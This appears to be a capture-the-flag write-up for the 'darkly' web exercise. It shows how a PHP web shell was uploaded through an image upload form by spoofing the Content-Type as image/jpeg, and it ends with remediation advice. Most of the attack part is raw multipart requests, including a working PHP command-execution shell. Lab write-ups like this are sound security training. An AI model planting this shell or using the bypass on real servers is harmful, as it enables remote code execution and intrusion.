HOW WE FOUND IT
find the page http://darkly/?page=upload from main page

possibility to upload image, jpg works. POST Request =
	-----------------------------19018515723217967980764003818
	Content-Disposition: form-data; name="MAX_FILE_SIZE"
	
	100000
	-----------------------------19018515723217967980764003818
	Content-Disposition: form-data; name="uploaded"; filename="grace_hopper.jpg"
	Content-Type: image/jpeg
	
	[[BINARY JPEG]]
	
	-----------------------------19018515723217967980764003818
	Content-Disposition: form-data; name="Upload"
	
	Upload
	-----------------------------19018515723217967980764003818--

is it possible to upload other things that jpg ? Let's say... PHP code ? (In order to get a RCE on the server through a web shell)

try to upload php --> fail
	-----------------------------2355551310853265194192670246
	Content-Disposition: form-data; name="MAX_FILE_SIZE"
	
	100000
	-----------------------------2355551310853265194192670246
	Content-Disposition: form-data; name="uploaded"; filename="test.php"
	Content-Type: application/x-php
	
	<?php
	if(isset($_GET['cmd']))
	{
		system($_GET['cmd']);
	}
	?>
	
	-----------------------------2355551310853265194192670246
	Content-Disposition: form-data; name="Upload"
	
	Upload
	-----------------------------2355551310853265194192670246--

how does the server parse this file to verify it's a jpg and nothing else ?
Let's try to upload the php script again, but modify the Content-Type to image/jpeg instead of application/x-php in the POST form data...

SUCCESS !!! File type control was bypassed, PHP code was uploaded on the server, we get the flag


PROBLEM
The website is vulnerable to file upload through the image upload functionality, which can lead to RCE (Remote Code Execution).

SOLUTION
Several corrections exist for this vulnerability :
- whitelist the authorized file names, this way all other user input is let down
- don't store the uploaded files on the same server (prefer an amazon S3 bucket for instance)
- Implement strong parsing checks to verify the file type (verify thoroughly the content of the uploaded file)
